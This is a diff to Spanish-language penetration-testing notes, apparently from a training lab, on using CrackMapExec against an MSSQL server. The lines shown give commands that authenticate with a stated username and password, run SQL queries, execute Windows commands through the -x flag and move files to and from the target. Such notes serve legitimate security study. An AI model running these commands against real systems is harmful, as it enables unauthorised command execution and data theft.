@@ -35,6 +35,17 @@ Agregamos la flag: --local-auth
 
     crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [db].[dbo].<tabla>" 
 
-### Ejecutar comandos de windows
+# Ejecutar comandos de windows
+Si el user es DBA podemos ejecutar comandos con la flag -x
 
+    crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -x whoami
 
+# Traspso de archivos
+
+### Para enviar un archivo
+
+    crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file <path_archivo_local> <path_completo_destino>
+
+### Para descargar un archivo
+
+    crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file <path_file> <file_a_crear>
